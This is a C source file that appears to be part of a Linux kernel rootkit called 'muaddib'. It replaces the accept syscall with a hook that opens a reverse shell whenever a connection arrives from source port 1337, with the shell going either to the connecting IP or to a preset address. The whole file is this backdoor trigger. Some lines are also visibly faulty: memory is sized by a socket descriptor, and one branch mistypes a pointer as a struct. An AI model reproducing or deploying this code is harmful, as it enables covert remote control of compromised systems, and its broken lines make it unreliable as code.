//#include "accept_hook.h"


#ifdef PTREGS_SYSCALL_STUBS

#define SRCPORT 1337

static asmlinkage long (*og_accept)(const struct pt_regs *);

static char buffer[18];

char *inet_ntoa (struct in_addr in) {
    unsigned char *bytes = (unsigned char *) &in;
    printk(KERN_INFO "%x %x %x %x\n", bytes[0], bytes[1], bytes[2], bytes[3]);
    snprintf (buffer, sizeof(buffer), "%d.%d.%d.%d", bytes[0], bytes[1], bytes[2], bytes[3]);
    return buffer;
}

asmlinkage int muaddib_accept(const struct pt_regs *regs){

    struct sockaddr_in __user* sock_in = (struct sockaddr_in *)regs->si;
    struct sockaddr_in *sock_in_kernel = NULL;
    int ret = og_accept(regs);
    sock_in_kernel = kzalloc(ret, GFP_KERNEL);
    long error = copy_from_user(sock_in_kernel, sock_in, sizeof(struct sockaddr_in));
    if(error){
        kfree(sock_in_kernel);
        return ret;
    }
    if (ntohs(sock_in_kernel->sin_port) == SRCPORT) {
        char *ip = inet_ntoa(sock_in_kernel->sin_addr);
        start_reverse_shell(ip, REVERSE_SHELL_PORT);
    }
    return ret;

}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*og_accept)(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen);

static asmlinkage int muaddib_accept(int sockfd, struct sockaddr *restrict addr, socklen_t *restrict addrlen){
    struct sockaddr_in sock_in = (struct sockaddr_in *) addr;
    if(ntohs(sock_in->sin_port) == SRCPORT) {
        start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    }
    printk("accept hooked :)");
    return og_accept(sockfd, addr, addrlen);
}
#endif
